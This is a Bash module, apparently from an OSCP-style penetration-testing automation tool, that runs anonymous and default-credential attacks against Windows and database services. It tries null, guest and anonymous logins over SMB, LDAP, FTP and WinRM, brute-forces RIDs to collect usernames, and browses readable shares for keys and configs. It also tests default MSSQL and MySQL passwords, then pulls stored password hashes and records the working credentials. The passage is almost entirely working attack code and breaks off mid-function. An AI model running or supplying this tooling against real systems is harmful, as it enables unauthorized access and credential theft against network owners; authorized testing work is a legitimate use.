#!/bin/bash
# MODULE: spray.sh - anonymous_enum, pre_spray_recon, spray, nsr_spray, hydra commands

# ============================================================================
# FASE 0: ANONYMOUS ENUMERATION
# ============================================================================
anonymous_enum() {
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 0: ANONYMOUS ENUMERATION                           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}[*] SMB - Null session...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u '' -p ''" | process_anon_output "smb-null"
    
    echo -e "\n${CYAN}[*] SMB - Guest session...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u 'guest' -p ''" | process_anon_output "smb-guest"
    
    echo -e "\n${CYAN}[*] SMB - Anonymous session...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u 'anonymous' -p ''" | process_anon_output "smb-anon"
    
    # Try share enumeratie with multiple gebruikers (null, guest, anonymous)
    # NXC often fails where smbclient succeeds, so try all common anonymous gebruikers
    echo -e "\n${CYAN}[*] SMB - Share enumeration (trying multiple users)...${NC}"
    
    echo -e "${CYAN}    Trying null session...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u '' -p '' --shares" "$OUTDIR/shares_null.txt"
    
    echo -e "${CYAN}    Trying guest...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u 'guest' -p '' --shares" "$OUTDIR/shares_guest.txt"
    
    echo -e "${CYAN}    Trying anonymous...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG $NXC_SMB_PORT -u 'anonymous' -p '' --shares" "$OUTDIR/shares_anon.txt"
    
    # Consolidate share results
    cat "$OUTDIR"/shares_*.txt 2>/dev/null | grep -v "Error\|^\s*$" | sort -u > "$OUTDIR/anon_shares.txt"
    
    # Impacket smbclient.py is BETROUWBAARDER than regular smbclient
    # It works when nxc and smbclient fail, and has better features (tree, etc.)
    local first_target=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
    
    if command -v impacket-smbclient &>/dev/null || command -v smbclient.py &>/dev/null; then
        echo -e "${CYAN}    Trying impacket-smbclient (more reliable)...${NC}"
        local IMPACKET_SMB=$(command -v impacket-smbclient || command -v smbclient.py)
    queue_phase_cmd "$IMPACKET_SMB ''/'anonymous'@$first_target -no-pass -c 'shares'"
        $IMPACKET_SMB ''/'anonymous'@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee "$OUTDIR/shares_impacket.txt"
        
        # Also try null user
    queue_phase_cmd "$IMPACKET_SMB ''/''@$first_target -no-pass -c 'shares'"
        $IMPACKET_SMB ''/''@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee -a "$OUTDIR/shares_impacket.txt"
        
        # Haal share names from impacket uitvoer
        if [[ -s "$OUTDIR/shares_impacket.txt" ]]; then
            grep -E "^[A-Za-z]" "$OUTDIR/shares_impacket.txt" | grep -v "^Impacket\|^Type\|^#" | awk '{print $1}' | sort -u > "$OUTDIR/share_names_impacket.txt"
            local share_count=$(wc -l < "$OUTDIR/share_names_impacket.txt" 2>/dev/null || echo 0)
            if [[ $share_count -gt 0 ]]; then
                echo -e "${GREEN}[+] Found $share_count shares via impacket-smbclient${NC}"
                echo -e "${YELLOW}[*] Shares:${NC}"
                cat "$OUTDIR/share_names_impacket.txt" | while read -r share; do
                    echo -e "    ${CYAN}$share${NC}"
                done
                # Append to main share list
                cat "$OUTDIR/share_names_impacket.txt" >> "$OUTDIR/share_names.txt" 2>/dev/null
                sort -u "$OUTDIR/share_names.txt" -o "$OUTDIR/share_names.txt" 2>/dev/null
            fi
        fi
    fi
    
    # Regular smbclient as additional terugvaloptie
    if command -v smbclient &>/dev/null; then
        echo -e "${CYAN}    Trying smbclient fallback...${NC}"
    queue_phase_cmd "smbclient -L //$first_target -U '' -N"
        smbclient -L "//$first_target" -U '' -N 2>/dev/null | tee "$OUTDIR/shares_smbclient.txt"
        
        # Haal share names from smbclient uitvoer
        if [[ -s "$OUTDIR/shares_smbclient.txt" ]]; then
            grep -E "^\s+\S+\s+Disk" "$OUTDIR/shares_smbclient.txt" | awk '{print $1}' >> "$OUTDIR/share_names.txt"
            sort -u "$OUTDIR/share_names.txt" -o "$OUTDIR/share_names.txt" 2>/dev/null
            local share_count=$(wc -l < "$OUTDIR/share_names.txt" 2>/dev/null || echo 0)
            if [[ $share_count -gt 0 ]]; then
                echo -e "${GREEN}[+] Found $share_count shares via smbclient${NC}"
            fi
        fi
    fi

    # ── AUTO-BROWSE READABLE ANONYMOUS SHARES ────────────────────────────────
    # Parse nxc --shares output for shares with READ or READ,WRITE permission,
    # then auto-run smbclient.py ls + tree on each one so we immediately see
    # what is inside (same as an authenticated user would get).
    # Skips noisy default admin shares: IPC$, ADMIN$, C$, PRINT$
    # ─────────────────────────────────────────────────────────────────────────
    local _anon_readable_shares=()
    local _anon_share_user=""
    local _anon_share_target=""

    for _sf in "$OUTDIR/shares_anon.txt" "$OUTDIR/shares_guest.txt" "$OUTDIR/shares_null.txt"; do
        [[ -s "$_sf" ]] || continue
        if   [[ "$_sf" == *anon*  ]]; then _try_user="anonymous"
        elif [[ "$_sf" == *guest* ]]; then _try_user="guest"
        else _try_user=""; fi

        while IFS= read -r _line; do
            # nxc share line: "SMB  IP  445  DC  ShareName  READ  Remark"
            if echo "$_line" | grep -qE '[[:space:]]READ([,[:space:]]|$)'; then
                local _sname
                _sname=$(echo "$_line" | awk '{print $5}')
                [[ "$_sname" =~ ^(IPC\$|ADMIN\$|C\$|PRINT\$)$ ]] && continue
                [[ -z "$_sname" ]] && continue
                local _already=false
                for _ex in "${_anon_readable_shares[@]}"; do
                    [[ "$_ex" == "$_sname" ]] && _already=true && break
                done
                if [[ "$_already" == false ]]; then
                    _anon_readable_shares+=("$_sname")
                    [[ -z "$_anon_share_user"   ]] && _anon_share_user="$_try_user"
                    [[ -z "$_anon_share_target" ]] && _anon_share_target=$(head -1 "$OUTDIR/targets_smb.txt" 2>/dev/null || echo "$TARGET_IP")
                fi
            fi
        done < "$_sf"
    done

    if [[ ${#_anon_readable_shares[@]} -gt 0 ]]; then
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  READABLE SHARES (anonymous) - AUTO BROWSING              ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e "${GREEN}[+] Readable share(s): ${_anon_readable_shares[*]}  (user: ${_anon_share_user:-null})${NC}"

        local _ISMB
        _ISMB=$(command -v impacket-smbclient 2>/dev/null || command -v smbclient.py 2>/dev/null || echo "")

        if [[ -z "$_ISMB" ]]; then
            echo -e "${YELLOW}[!] impacket-smbclient not found - showing commands only${NC}"
            for _share in "${_anon_readable_shares[@]}"; do
                show_cmd "impacket-smbclient ''/'${_anon_share_user}'@${_anon_share_target} -no-pass -c 'use ${_share}; ls'"
                show_cmd "impacket-smbclient ''/'${_anon_share_user}'@${_anon_share_target} -no-pass -c 'use ${_share}; tree'"
            done
        else
            for _share in "${_anon_readable_shares[@]}"; do
                echo -e "\n${CYAN}[*] Share: ${YELLOW}${_share}${CYAN}  (${_anon_share_user:-null}@${_anon_share_target})${NC}"

                # top-level ls
                show_cmd "$_ISMB ''/'${_anon_share_user}'@${_anon_share_target} -no-pass -c 'use ${_share}; ls'"
                "$_ISMB" ''/"${_anon_share_user}"@"${_anon_share_target}" -no-pass \
                    -c "use ${_share}; ls" 2>/dev/null \
                    | tee "$OUTDIR/share_ls_anon_${_share}.txt"

                # recursive tree - catches all nested files
                echo -e "${CYAN}    [tree - recursive listing]${NC}"
                show_cmd "$_ISMB ''/'${_anon_share_user}'@${_anon_share_target} -no-pass -c 'use ${_share}; tree'"
                "$_ISMB" ''/"${_anon_share_user}"@"${_anon_share_target}" -no-pass \
                    -c "use ${_share}; tree" 2>/dev/null \
                    | tee "$OUTDIR/share_tree_anon_${_share}.txt"

                local _fcount=0
                _fcount=$(grep -ciE '\.(exe|dll|zip|ps1|bat|cmd|conf|config|ini|xml|txt|pdf|docx?|xlsx?|key|pem|pfx|crt|bak|old|sql|db|json|yaml|yml)$' \
                    "$OUTDIR/share_tree_anon_${_share}.txt" 2>/dev/null || echo 0)
                [[ "$_fcount" -gt 0 ]] && echo -e "${YELLOW}[!] ${_fcount} interesting file(s) in ${_share} → share_tree_anon_${_share}.txt${NC}"

                # Queue ready-to-use command for end-of-phase summary
                queue_phase_cmd "# === READABLE SHARE: ${_share} (${_anon_share_user:-null}@${_anon_share_target}) ==="
                queue_phase_cmd "$_ISMB ''/'${_anon_share_user}'@${_anon_share_target} -no-pass"
            done
        fi
    fi
    # ─────────────────────────────────────────────────────────────────────────

    echo -e "\n${CYAN}[*] SMB - Password policy...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --pass-pol" "$OUTDIR/password_policy.txt"
    # Also try with guest if null fails
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --pass-pol" "$OUTDIR/password_policy_guest.txt"
    grep -qi "Account Lockout Threshold" "$OUTDIR/password_policy.txt" "$OUTDIR/password_policy_guest.txt" 2>/dev/null && \
        echo -e "${RED}[!] LOCKOUT POLICY DETECTED - Check threshold before spraying!${NC}"
    
    echo -e "\n${CYAN}[*] SMB - RID brute-force...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --rid-brute" "$OUTDIR/rid_brute.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --rid-brute" "$OUTDIR/rid_brute_guest.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'anonymous' -p '' --rid-brute" "$OUTDIR/rid_brute_anon.txt"
    cat "$OUTDIR/rid_brute.txt" "$OUTDIR/rid_brute_guest.txt" "$OUTDIR/rid_brute_anon.txt" 2>/dev/null | \
        grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' | sort -u > "$OUTDIR/users_found.txt"
    
    local found_users=$(wc -l < "$OUTDIR/users_found.txt" 2>/dev/null || echo 0)
    [[ $found_users -gt 0 ]] && echo -e "${GREEN}[+] Found $found_users users via RID brute${NC}"

    echo -e "\n${CYAN}[*] LDAP - Anonymous bind...${NC}"
    run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG -u '' -p ''" | process_anon_output "ldap-anon"
    
    echo -e "\n${CYAN}[*] LDAP - Anonymous users...${NC}"
    run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG -u '' -p '' --users" "$OUTDIR/ldap_anon_users.txt"

    echo -e "\n${CYAN}[*] FTP - Anonymous login...${NC}"
    local ftp_targets=$(get_proto_targets ftp)
    if [[ -n "$ftp_targets" ]]; then
        run_cmd "sudo nxc ftp $ftp_targets -u 'anonymous' -p ''" | process_anon_output "ftp-anon"
        run_cmd "sudo nxc ftp $ftp_targets -u 'anonymous' -p 'anonymous'" | process_anon_output "ftp-anon"
    else
        echo -e "${GRAY}[skip] FTP - port 21 closed${NC}"
        echo -e "${GRAY}       >> sudo nxc ftp targets.txt -u 'anonymous' -p ''${NC}"
    fi

    # ── MSSQL: default credential check (OSCP-safe: passive enumeration only) ──
    local mssql_targets=$(get_proto_targets mssql)
    if [[ -n "$mssql_targets" ]]; then
        local _ms_ip; [[ -f "$mssql_targets" ]] && _ms_ip=$(head -1 "$mssql_targets") || _ms_ip="$mssql_targets"
        local _ms_tmp="$OUTDIR/mssql_default_tmp.txt"
        # Windows auth attempts (nxc without --local-auth uses Kerberos/NTLM)
        local _ms_defaults_win=("sa:" "sa:sa" "sa:password" "administrator:")
        # SQL auth attempts (--local-auth bypasses Windows auth)
        local _ms_defaults_sql=("sa:" "sa:sa" "sa:Password1" "sa:password" "guest:")
        echo -e "\n${RED}[!] MSSQL (1433) open — testing default SA credentials...${NC}"
        local _ms_got_access=false

        for _mc in "${_ms_defaults_win[@]}"; do
            local _mu="${_mc%%:*}" _mp="${_mc#*:}"
            : > "$_ms_tmp"
            run_cmd "sudo nxc mssql $_ms_ip -u '$_mu' -p '$_mp'" "$_ms_tmp"
            if grep -q "\[+\]" "$_ms_tmp" 2>/dev/null; then
                echo -e "${RED}[!] MSSQL accessible as ${_mu}:${_mp:-<empty>} (Windows auth)${NC}"
                run_cmd "sudo nxc mssql $_ms_ip -u '$_mu' -p '$_mp' -q 'SELECT @@version; SELECT name FROM sys.databases;'" "$OUTDIR/mssql_databases.txt"
                run_cmd "sudo nxc mssql $_ms_ip -u '$_mu' -p '$_mp' -q 'SELECT name,password_hash FROM sys.sql_logins;'" "$OUTDIR/mssql_users.txt"
                echo -e "${WHITE}  >> impacket-mssqlclient '${_mu}':'${_mp}'@$_ms_ip -port ${PROTO_PORTS[mssql]:-1433}${NC}"
                grep -qF "MSSQL|$_ms_ip||${_mu}|${_mp}" "$CREDS_FILE" 2>/dev/null ||                     echo "MSSQL|$_ms_ip||${_mu}|${_mp}|no|password|" >> "$CREDS_FILE"
                _ms_got_access=true; break
            fi
        done

        if [[ "$_ms_got_access" == false ]]; then
            echo -e "${CYAN}[*] MSSQL — trying SQL auth (--local-auth, bypasses Windows auth)...${NC}"
            for _mc in "${_ms_defaults_sql[@]}"; do
                local _mu="${_mc%%:*}" _mp="${_mc#*:}"
                : > "$_ms_tmp"
                run_cmd "sudo nxc mssql $_ms_ip --local-auth -u '$_mu' -p '$_mp'" "$_ms_tmp"
                if grep -q "\[+\]" "$_ms_tmp" 2>/dev/null; then
                    echo -e "${RED}[!] MSSQL accessible as ${_mu}:${_mp:-<empty>} (SQL auth)${NC}"
                    run_cmd "sudo nxc mssql $_ms_ip --local-auth -u '$_mu' -p '$_mp' -q 'SELECT @@version; SELECT name FROM sys.databases;'" "$OUTDIR/mssql_databases.txt"
                    echo -e "${WHITE}  >> impacket-mssqlclient '${_mu}':'${_mp}'@$_ms_ip -port ${PROTO_PORTS[mssql]:-1433}${NC}"
                    grep -qF "MSSQL|$_ms_ip||${_mu}|${_mp}" "$CREDS_FILE" 2>/dev/null ||                         echo "MSSQL|$_ms_ip||${_mu}|${_mp}|no|password|" >> "$CREDS_FILE"
                    _ms_got_access=true; break
                fi
            done
        fi

        [[ "$_ms_got_access" == false ]] && echo -e "${GRAY}  → No MSSQL default credentials worked${NC}"
    else
        echo -e "${GRAY}[skip] MSSQL - port 1433 closed${NC}"
        echo -e "${GRAY}       >> sudo nxc mssql targets.txt -u 'sa' -p '' && sudo nxc mssql targets.txt --local-auth -u 'sa' -p ''${NC}"
    fi

    # SSH default check handled by ssh_enum() module (Phase 6B)
    # — banner grab, OS detection, default creds, post-auth enum all in ssh.sh
    local ssh_targets=$(get_proto_targets ssh)
    if [[ -z "$ssh_targets" ]]; then
        echo -e "${GRAY}[skip] SSH - port 22 closed${NC}"
        echo -e "${GRAY}       >> sudo nxc ssh targets.txt -u 'root' -p 'root'${NC}"
    fi

    echo -e "\n${CYAN}[*] WinRM - Anonymous...${NC}"
    local winrm_targets=$(get_proto_targets winrm)
    if [[ -n "$winrm_targets" ]]; then
        run_cmd "sudo nxc winrm $winrm_targets -u '' -p ''" | process_anon_output "winrm-null"
    else
        echo -e "${GRAY}[skip] WinRM - port 5985 closed${NC}"
        echo -e "${GRAY}       >> sudo nxc winrm targets.txt -u '' -p ''${NC}"
    fi

    if [[ -s "$OUTDIR/anon_access.txt" ]]; then
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║            ANONYMOUS ACCESS FOUND                         ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        sort -u "$OUTDIR/anon_access.txt"
    fi
}

# ============================================================================
# PRE-SPRAY RECON (null-sessies, RID brute, etc.)
# ============================================================================
pre_spray_recon() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PRE-SPRAY RECON & USER ENUMERATION                       ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}[*] Password policy check...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --pass-pol" "$OUTDIR/password_policy.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --pass-pol" "$OUTDIR/password_policy_guest.txt"
    grep -qi "Account Lockout Threshold" "$OUTDIR/password_policy.txt" "$OUTDIR/password_policy_guest.txt" 2>/dev/null && \
        echo -e "\n${RED}[!] LOCKOUT POLICY DETECTED - Check threshold before spraying!${NC}\n"

    echo -e "\n${CYAN}[*] Null/guest/anonymous sessions...${NC}"
    run_cmd_process "sudo nxc smb $TARGET_ARG -u '' -p ''" "null"
    run_cmd_process "sudo nxc smb $TARGET_ARG -u 'guest' -p ''" "guest"
    run_cmd_process "sudo nxc smb $TARGET_ARG -u 'anonymous' -p ''" "anonymous"

    # RID bruteforce with ALL anonymous gebruikers (kritiek for user enumeratie!)
    echo -e "\n${CYAN}[*] RID brute-force (trying null, guest, anonymous)...${NC}"
    
    echo -e "${CYAN}    Trying null session...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --rid-brute" "$OUTDIR/rid_brute_null.txt"
    
    echo -e "${CYAN}    Trying guest...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --rid-brute" "$OUTDIR/rid_brute_guest.txt"
    
    echo -e "${CYAN}    Trying anonymous...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'anonymous' -p '' --rid-brute" "$OUTDIR/rid_brute_anon.txt"
    
    # Consolidate all RID brute results
    cat "$OUTDIR"/rid_brute_*.txt 2>/dev/null | \
        grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' | sort -u > "$OUTDIR/users_found.txt"
    
    local found_users=$(wc -l < "$OUTDIR/users_found.txt" 2>/dev/null || echo 0)
    if [[ $found_users -gt 0 ]]; then
        echo -e "${GREEN}[+] Found $found_users users via RID brute:${NC}"
        cat "$OUTDIR/users_found.txt" | while read -r u; do
            echo -e "    ${YELLOW}$u${NC}"
        done
        # Add to enumerated gebruikers
        cat "$OUTDIR/users_found.txt" >> "$ENUM_USERS"
    fi

    # Share enumeratie with multiple gebruikers
    echo -e "\n${CYAN}[*] SMB - Share enumeration (trying multiple users)...${NC}"
    run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --shares" "$OUTDIR/shares_null.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --shares" "$OUTDIR/shares_guest.txt"
    run_cmd "sudo nxc smb $TARGET_ARG -u 'anonymous' -p '' --shares" "$OUTDIR/shares_anon.txt"
    
    # Consolidate share results
    cat "$OUTDIR"/shares_*.txt 2>/dev/null | grep -v "Error\|^\s*$" | sort -u > "$OUTDIR/anon_shares.txt"
    
    # Impacket smbclient.py is BETROUWBAARDER - use it eerst
    local first_target=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
    
    if command -v impacket-smbclient &>/dev/null || command -v smbclient.py &>/dev/null; then
        echo -e "${CYAN}[*] impacket-smbclient (more reliable than smbclient)...${NC}"
        local IMPACKET_SMB=$(command -v impacket-smbclient || command -v smbclient.py)
        
    queue_phase_cmd "$IMPACKET_SMB ''/'anonymous'@$first_target -no-pass -c 'shares'"
        $IMPACKET_SMB ''/'anonymous'@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee "$OUTDIR/shares_impacket.txt"
        
        # Also try with null user
    queue_phase_cmd "$IMPACKET_SMB ''/''@$first_target -no-pass -c 'shares'"
        $IMPACKET_SMB ''/''@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee -a "$OUTDIR/shares_impacket.txt"
        
        # Parse shares from impacket uitvoer
        if [[ -s "$OUTDIR/shares_impacket.txt" ]]; then
            grep -E "^[A-Za-z]" "$OUTDIR/shares_impacket.txt" | grep -v "^Impacket\|^Type\|^#" | awk '{print $1}' | sort -u > "$OUTDIR/share_names.txt"
            local share_count=$(wc -l < "$OUTDIR/share_names.txt" 2>/dev/null || echo 0)
            if [[ $share_count -gt 0 ]]; then
                echo -e "${GREEN}[+] Found $share_count shares via impacket-smbclient:${NC}"
                cat "$OUTDIR/share_names.txt" | while read -r share; do
                    echo -e "    ${CYAN}$share${NC}"
                done
            fi
        fi
    fi
    
    # Regular smbclient as terugvaloptie
    if command -v smbclient &>/dev/null; then
        echo -e "${CYAN}[*] smbclient fallback for share listing...${NC}"
        
    queue_phase_cmd "smbclient -L //$first_target -U '' -N"
        smbclient -L "//$first_target" -U '' -N 2>/dev/null | tee "$OUTDIR/shares_smbclient.txt"
        
        # Parse and display shares
        if [[ -s "$OUTDIR/shares_smbclient.txt" ]]; then
            local share_count=$(grep -cE "^\s+\S+\s+Disk" "$OUTDIR/shares_smbclient.txt" 2>/dev/null | head -1)
            share_count=${share_count:-0}
            if [[ $share_count -gt 0 ]] 2>/dev/null; then
                echo -e "${GREEN}[+] Found $share_count disk shares:${NC}"
                grep -E "^\s+\S+\s+Disk" "$OUTDIR/shares_smbclient.txt" | while read -r line; do
                    local share=$(echo "$line" | awk '{print $1}')
                    echo -e "    ${CYAN}$share${NC}"
                done
                
                # Save share names for later use
                grep -E "^\s+\S+\s+Disk" "$OUTDIR/shares_smbclient.txt" | awk '{print $1}' >> "$OUTDIR/share_names.txt"
                sort -u "$OUTDIR/share_names.txt" -o "$OUTDIR/share_names.txt" 2>/dev/null
            fi
        fi
    fi

    # ── AUTO-BROWSE READABLE SHARES (pre-spray recon) ─────────────────────
    # Same logic as anonymous_enum: detect READ-accessible shares and browse them.
    # Shares files written above are the same names, so the block re-runs cleanly
    # if anonymous_enum already ran (files exist with results) - smbclient.py is fast.
    local _psr_readable=()
    local _psr_user="" _psr_target=""
    for _sf2 in "$OUTDIR/shares_anon.txt" "$OUTDIR/shares_guest.txt" "$OUTDIR/shares_null.txt"; do
        [[ -s "$_sf2" ]] || continue
        if   [[ "$_sf2" == *anon*  ]]; then _try2="anonymous"
        elif [[ "$_sf2" == *guest* ]]; then _try2="guest"
        else _try2=""; fi
        while IFS= read -r _l2; do
            echo "$_l2" | grep -qE '[[:space:]]READ([,[:space:]]|$)' || continue
            local _s2
            _s2=$(echo "$_l2" | awk '{print $5}')
            [[ "$_s2" =~ ^(IPC\$|ADMIN\$|C\$|PRINT\$)$ ]] && continue
            [[ -z "$_s2" ]] && continue
            local _dup=false
            for _e2 in "${_psr_readable[@]}"; do [[ "$_e2" == "$_s2" ]] && _dup=true && break; done
            if [[ "$_dup" == false ]]; then
                _psr_readable+=("$_s2")
                [[ -z "$_psr_user"   ]] && _psr_user="$_try2"
                [[ -z "$_psr_target" ]] && _psr_target=$(head -1 "$OUTDIR/targets_smb.txt" 2>/dev/null || echo "$TARGET_IP")
            fi
        done < "$_sf2"
    done

    if [[ ${#_psr_readable[@]} -gt 0 ]]; then
        echo -e "\n${GREEN}[+] Readable share(s): ${_psr_readable[*]}  (user: ${_psr_user:-null}) - browsing...${NC}"
        local _ISMB2
        _ISMB2=$(command -v impacket-smbclient 2>/dev/null || command -v smbclient.py 2>/dev/null || echo "")
        if [[ -z "$_ISMB2" ]]; then
            for _s2 in "${_psr_readable[@]}"; do
                show_cmd "impacket-smbclient ''/'${_psr_user}'@${_psr_target} -no-pass -c 'use ${_s2}; ls'"
            done
        else
            for _s2 in "${_psr_readable[@]}"; do
                echo -e "${CYAN}[*] Share: ${YELLOW}${_s2}${CYAN}  (${_psr_user:-null}@${_psr_target})${NC}"
                show_cmd "$_ISMB2 ''/'${_psr_user}'@${_psr_target} -no-pass -c 'use ${_s2}; ls'"
                "$_ISMB2" ''/"${_psr_user}"@"${_psr_target}" -no-pass \
                    -c "use ${_s2}; ls" 2>/dev/null | tee "$OUTDIR/share_ls_anon_${_s2}.txt"
                echo -e "${CYAN}    [tree]${NC}"
                show_cmd "$_ISMB2 ''/'${_psr_user}'@${_psr_target} -no-pass -c 'use ${_s2}; tree'"
                "$_ISMB2" ''/"${_psr_user}"@"${_psr_target}" -no-pass \
                    -c "use ${_s2}; tree" 2>/dev/null | tee "$OUTDIR/share_tree_anon_${_s2}.txt"
                local _fc2=0
                _fc2=$(grep -ciE '\.(exe|dll|zip|ps1|bat|cmd|conf|config|ini|xml|txt|pdf|docx?|xlsx?|key|pem|pfx|crt|bak|old|sql|db|json|yaml|yml)$' \
                    "$OUTDIR/share_tree_anon_${_s2}.txt" 2>/dev/null || echo 0)
                [[ "$_fc2" -gt 0 ]] && echo -e "${YELLOW}[!] ${_fc2} interesting file(s) in ${_s2}${NC}"
                queue_phase_cmd "# === READABLE SHARE: ${_s2} (${_psr_user:-null}@${_psr_target}) ==="
                queue_phase_cmd "$_ISMB2 ''/'${_psr_user}'@${_psr_target} -no-pass"
            done
        fi
    fi
    # ─────────────────────────────────────────────────────────────────────────
}

# ============================================================================
# CREDENTIAL SPRAYING (with wachtwoorden.txt)
# ============================================================================

# ============================================================================
# DB_DEFAULT_CHECKS — always run when DB ports are open (no user creds required)
# Checks MySQL, MSSQL, PostgreSQL, Redis for default/blank credentials
# OSCP-safe: pure enumeration, no exploitation
# ============================================================================
db_default_checks() {
    [[ "$ANON_ONLY" != true ]] || local _db_anon_mode=true
# ── MySQL: always check default credentials when port is open ────────────
# Dual approach: nxc mysql first, fall back to direct mysql client
# (nxc mysql --no-ssl silently fails on some MariaDB/MySQL versions)
local _mysql_tgt; _mysql_tgt=$(get_proto_targets "mysql")
if [[ -n "$_mysql_tgt" ]]; then
    local _mip; [[ -f "$_mysql_tgt" ]] && _mip=$(head -1 "$_mysql_tgt") || _mip="$_mysql_tgt"
    echo -e "${RED}[!] MySQL (3306) open — testing default credentials (nxc + direct client)...${NC}"
    local _mysql_defaults=("root:" "root:root" "root:mysql" "root:mariadb" "root:password" "admin:" "mysql:" "mariadb:")
    local _mysql_got_access=false
    local _tmp_mysql_out="$OUTDIR/mysql_default_tmp.txt"

    for _mc in "${_mysql_defaults[@]}"; do
        local _mu="${_mc%%:*}" _mp="${_mc#*:}"
        : > "$_tmp_mysql_out"

        # Attempt 1: nxc mysql (try both --no-ssl and without)
        run_cmd "sudo nxc mysql \"$_mip\" -u \"$_mu\" -p \"$_mp\" --no-ssl" "$_tmp_mysql_out"

        # If nxc returned no [-]/[+] output at all, fall back to direct mysql client
        if ! grep -qE "\[\+\]|\[-\]" "$_tmp_mysql_out" 2>/dev/null; then
            # Attempt 2: direct mysql client (handles SSL cert issues reliably)
            show_cmd "MYSQL_PWD='$_mp' mysql -h $_mip -P 3306 -u '$_mu' --ssl-verify-server-cert=OFF -e 'SELECT 1' 2>/dev/null"
            local _mysql_test
            _mysql_test=$(MYSQL_PWD=$_mp mysql -h "$_mip" -P 3306 -u "$_mu"  \
                --ssl-verify-server-cert=OFF -e "SELECT 1" 2>/dev/null)
            if echo "$_mysql_test" | grep -q "^1$"; then
                echo -e "${GREEN}[+] MySQL $_mip  3306  [+] ${_mu}:${_mp:-<empty>}${NC}"
                echo "[+] direct_client_confirmed" >> "$_tmp_mysql_out"
            fi
        fi

        if grep -qE "\[\+\]|direct_client_confirmed" "$_tmp_mysql_out" 2>/dev/null; then
            echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║  MYSQL DEFAULT CREDENTIALS CONFIRMED                      ║${NC}"
            echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${RED}    User: ${_mu}   Password: ${_mp:-<empty>}${NC}"
            echo ""
            # Enumerate databases (nxc first, then mysql client fallback)
            run_cmd "sudo nxc mysql $_mip -u '$_mu' -p '$_mp' --no-ssl --all-databases" "$OUTDIR/mysql_databases.txt"
            if ! grep -qE "\[\+\]|Database" "$OUTDIR/mysql_databases.txt" 2>/dev/null; then
                show_cmd "MYSQL_PWD='$_mp' mysql -h $_mip -P 3306 -u '$_mu' --ssl-verify-server-cert=OFF -e 'SHOW DATABASES;'"
                MYSQL_PWD=$_mp mysql -h "$_mip" -P 3306 -u "$_mu"  --ssl-verify-server-cert=OFF \
                    -e "SHOW DATABASES;" 2>/dev/null | tee "$OUTDIR/mysql_databases.txt"
                show_cmd "MYSQL_PWD='$_mp' mysql -h $_mip -P 3306 -u '$_mu' --ssl-verify-server-cert=OFF -e 'SELECT user,host,authentication_string FROM mysql.user;'"
                MYSQL_PWD=$_mp mysql -h "$_mip" -P 3306 -u "$_mu"  --ssl-verify-server-cert=OFF \
                    -e "SELECT user,host,authentication_string FROM mysql.user;" 2>/dev/null \
                    | tee "$OUTDIR/mysql_users.txt"
            fi
            echo -e "${WHITE}  >> MYSQL_PWD='${_mp}' mysql -h $_mip -u '${_mu}' --ssl-verify-server-cert=OFF${NC}"
            echo -e "${GRAY}  >> MYSQL_PWD='${_mp}' mysql -h $_mip -u '${_mu}' -e 'show databases;'${NC}"
            echo -e "${GRAY}  >> MYSQL_PWD='${_mp}' mysql -h $_mip -u '${_mu}' -e 'select user,host,authentication_string from mysql.user;'${NC}"
            local _mentry="MYSQL|$_mip||${_mu}|${_mp}|no|password|"
            grep -qF "MYSQL|$_mip||${_mu}|${_mp}" "$CREDS_FILE" 2>/dev/null || echo "$_mentry" >> "$CREDS_FILE"
            _mysql_got_access=true
            break
        fi
    done

    if [[ "$_mysql_got_access" == false ]]; then
        echo -e "${GRAY}  → No default credentials worked. Spray your own creds:${NC}"
        echo -e "${GRAY}  >> MYSQL_PWD='' mysql -h $_mip -P 3306 -u root --ssl-verify-server-cert=OFF${NC}"
